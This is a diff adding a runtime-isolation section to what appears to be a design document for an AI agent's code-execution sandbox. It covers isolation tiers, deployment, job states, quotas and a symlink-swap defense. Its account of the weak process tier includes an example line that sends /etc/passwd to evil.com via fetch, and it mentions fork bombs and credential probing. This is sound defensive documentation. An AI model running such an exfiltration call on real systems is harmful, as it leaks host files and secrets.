@@ -353,3 +353,82 @@ Every file tool call records the following audit fields:
 - `accessDecision` — one of the values in §9.3.
 
 Denied calls are recorded with the same fields.
+
+---
+
+## 10. Runtime isolation tiers
+
+### 10.1 Architecture
+
+Code execution is delegated to a separate sandbox-worker mini-service listening on port
+3030. The Next.js API server enqueues jobs via HTTP and awaits results; it does not fork
+or exec inline. A crash, hang, or resource exhaustion in the sandbox therefore cannot
+take down the API server or any in-flight request. The worker auto-detects Docker at
+boot and selects the strongest tier available, falling back to a process tier when no
+container runtime is present.
+
+### 10.2 Isolation tiers
+
+| Tier | Isolation | Network | Filesystem | Memory | Use case |
+|---|---|---|---|---|---|
+| `process` | child process, empty env, 10s timeout, 1 MB maxBuffer, `detached` kill | NOT restricted | cwd=workspace (but Node fs can read absolute host paths) | not capped (V8 heap limit) | Dev only. Trusted code. Single-user. |
+| `docker` | container via `docker run --network none --read-only --memory 512m --cpus 1 --pids-limit 16 --user nobody --cap-drop ALL` | blocked (`--network none`) | read-only rootfs, only /workspace mounted rw, /tmp is tmpfs | capped 512m | Production minimum. Untrusted code. Multi-user. |
+| `gvisor` | gVisor sandbox (runsc) — userspace kernel | blocked | same as docker + gVisor syscall filter | capped | Stronger. Untrusted code with kernel exploit risk. |
+| `microvm` | Firecracker / Kata Containers — true VM | blocked | isolated VM with its own kernel | capped | Strongest. Regulated / hostile code. |
+
+### 10.3 Honest limitations of the process tier
+
+The process tier is **not** OS-level isolation. It is the same Node process boundary
+the API server runs under, with an empty env, a cwd pin, and a kill timer. A determined
+adversary with code execution in the process tier can:
+
+- Read world-readable host files (`/etc/hostname`, `/etc/passwd`, `/etc/os-release`)
+  via Node's `fs` APIs — absolute paths are not blocked by `cwd`.
+- Make outbound network requests — there is no `--network none` equivalent.
+  `fetch('https://evil.com', { body: fs.readFileSync('/etc/passwd') })` succeeds.
+- Fork-bomb or exhaust file descriptors until the 10s timeout fires — there is no
+  `--pids-limit` or cgroup memory cap.
+- Probe for credentials in `/tmp`, `/var`, the project directory, or anywhere the
+  API user can read.
+
+Use the process tier ONLY for trusted code (you wrote it, or the model wrote it for a
+task you understand). For untrusted code — user-supplied, from the internet, or
+adversarial — deploy the docker tier (or stronger).
+
+### 10.4 Production deployment
+
+- Pull a minimal image: `docker pull node:20-slim` (or pin the digest, e.g.
+  `node:20-slim@sha256:…`).
+- Set `SANDBOX_DOCKER_IMAGE` to pin the image the worker runs jobs in.
+- Point `SANDBOX_WORKER_URL` at a load-balanced pool of sandbox workers.
+- Swap the in-memory job queue for Redis + BullMQ for horizontal scaling and
+  durability across worker restarts.
+- Consider a worker pool (one worker per CPU) with job routing to balance latency
+  against isolation.
+- For regulated workloads, use gVisor (`docker --runtime=runsc`) or Firecracker / Kata
+  Containers for true VM-level isolation.
+
+### 10.5 Job status machine
+
+```
+QUEUED → RUNNING → COMPLETED   (exit 0)
+                 → FAILED      (non-zero exit)
+                 → TIMEOUT     (killed at 10s)
+                 → CANCELLED   (user aborted)
+```
+
+Every `SandboxJob` row records `isolationTier`, `exitCode`, `stdout`, `stderr`,
+`startedAt`, `finishedAt`, and `limitsJson`, so audits show what actually ran under
+which tier. Queryable via `/api/audit` filtered by `toolName=run_code_sandbox`.
+
+### 10.6 Quotas and file lifecycle (P1)
+
+- Workspace quotas: 100 MB storage, 500 files, 20 MB per upload, 1 concurrent sandbox
+  job per workspace.
+- File lifecycle: `UPLOADED → SCANNING → READY | QUARANTINED → INDEXED → DELETED`.
+  Only `READY` / `INDEXED` files are readable by the agent.
+- MIME sniffing via magic bytes (not extension). Executables and shell scripts are
+  blocklisted and quarantined on detection.
+- TOCTOU defense: `readWorkspaceFileToctouSafe` opens the file with `O_NOFOLLOW` and
+  `fstat`s the resulting fd before reading — a symlink swap between the path check
+  and the open is rejected.
